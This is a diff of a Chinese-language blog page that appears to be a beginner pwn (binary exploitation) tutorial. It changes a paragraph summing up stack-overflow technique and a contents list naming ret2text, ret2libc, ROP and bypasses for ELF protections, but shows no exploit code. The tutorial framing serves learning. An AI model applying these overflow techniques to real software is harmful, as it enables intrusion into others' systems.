 <p><strong>完整exp:</strong></p>
@@ -470,7 +532,7 @@
 
 
 <p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p>
-<h2 id="ELF文件保护机制及基本绕过手法"><a href="#ELF文件保护机制及基本绕过手法" class="headerlink" title="ELF文件保护机制及基本绕过手法"></a>ELF文件保护机制及基本绕过手法</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3>
+
     </div>
 
     
@@ -487,7 +549,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/" title="pwn の学习之路">http://hacbit.tech/pwn-の学习之路/</a>
+    <a href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/" title="pwn の学习之路">http://hacbit.tech/pwn新手村/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -585,7 +647,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81nc%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%81"><span class="nav-number">2.</span> <span class="nav-text">也许需要nc一下？！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9F%EF%BC%81%E6%BA%A2%E5%87%BA%E4%B8%80%E4%B8%8B%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">这是什么？缓冲区？！溢出一下！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E3%81%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">栈の基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%EF%BC%9F%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">什么是栈？（stack）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E5%B8%A7%EF%BC%9F%EF%BC%88stack-frame%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">什么是栈帧？（stack frame）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bss%EF%BC%8Cdata%EF%BC%8Ctext%EF%BC%8Cheap-amp-stack"><span class="nav-number">3.2.</span> <span class="nav-text">bss，data，text，heap &amp; stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-segment%EF%BC%9A"><span class="nav-number">3.2.1.</span> <span class="nav-text">bss segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-segment%EF%BC%9A"><span class="nav-number">3.2.2.</span> <span class="nav-text">data segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-text-segment%EF%BC%9A"><span class="nav-number">3.2.3.</span> <span class="nav-text">code(text) segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%EF%BC%88heap%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.4.</span> <span class="nav-text">堆（heap）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.2.5.</span> <span class="nav-text">栈（stack）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%9F%BA%E7%A1%80"><span class="nav-number">3.3.</span> <span class="nav-text">pwntools基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="nav-number">3.3.1.</span> <span class="nav-text">安装pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">pwntools使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">基本框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#send-or-receive"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">send or receive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%89%93%E5%8C%85"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">数据打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">输出数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cyclic-pattern"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">Cyclic pattern</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">ELF文件操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyROP"><span class="nav-number">3.4.</span> <span class="nav-text">babyROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">3.4.1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81ROP"><span class="nav-number">3.4.2.</span> <span class="nav-text">为什么要ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">3.4.3.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2text"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.4.3.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.4.3.4.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%9F%BA%E6%9C%AC%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">ELF文件保护机制及基本绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#canary"><span class="nav-number">3.5.1.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE"><span class="nav-number">3.5.2.</span> <span class="nav-text">PIE</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81nc%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%81"><span class="nav-number">2.</span> <span class="nav-text">也许需要nc一下？！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9F%EF%BC%81%E6%BA%A2%E5%87%BA%E4%B8%80%E4%B8%8B%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">这是什么？缓冲区？！溢出一下！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E3%81%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">栈の基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%EF%BC%9F%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">什么是栈？（stack）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E5%B8%A7%EF%BC%9F%EF%BC%88stack-frame%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">什么是栈帧？（stack frame）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bss%EF%BC%8Cdata%EF%BC%8Ctext%EF%BC%8Cheap-amp-stack"><span class="nav-number">3.2.</span> <span class="nav-text">bss，data，text，heap &amp; stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-segment%EF%BC%9A"><span class="nav-number">3.2.1.</span> <span class="nav-text">bss segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-segment%EF%BC%9A"><span class="nav-number">3.2.2.</span> <span class="nav-text">data segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-text-segment%EF%BC%9A"><span class="nav-number">3.2.3.</span> <span class="nav-text">code(text) segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%EF%BC%88heap%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.4.</span> <span class="nav-text">堆（heap）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.2.5.</span> <span class="nav-text">栈（stack）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%9F%BA%E7%A1%80"><span class="nav-number">3.3.</span> <span class="nav-text">pwntools基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="nav-number">3.3.1.</span> <span class="nav-text">安装pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">pwntools使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">基本框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#send-or-receive"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">send or receive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%89%93%E5%8C%85"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">数据打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">输出数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cyclic-pattern"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">Cyclic pattern</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">ELF文件操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">3.4.</span> <span class="nav-text">ELF文件保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Canary"><span class="nav-number">3.4.1.</span> <span class="nav-text">Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NX%EF%BC%88DEP%EF%BC%89"><span class="nav-number">3.4.2.</span> <span class="nav-text">NX（DEP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE%EF%BC%88ASLR%EF%BC%89"><span class="nav-number">3.4.3.</span> <span class="nav-text">PIE（ASLR）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RELRO"><span class="nav-number">3.4.4.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FORTIFY"><span class="nav-number">3.4.5.</span> <span class="nav-text">FORTIFY</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%AFbabyROP%E5%90%A7"><span class="nav-number">3.5.</span> <span class="nav-text">是babyROP吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">3.5.1.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2text"><span class="nav-number">3.5.1.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.5.1.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.5.1.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.5.1.4.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -936,13 +998,13 @@ if(canvas.getContext){
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">6k</span>
+    <span title="Symbols count total">7k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">11 mins.</span>
+    <span title="Reading time total">13 mins.</span>
 </div>
   <div class="powered-by">
     <!--Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> -->
@@ -950,7 +1012,7 @@ if(canvas.getContext){
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">The blog has a total of 6.4k words</span>
+  <span class="post-count">The blog has a total of 7.5k words</span>
 </div>
 
 
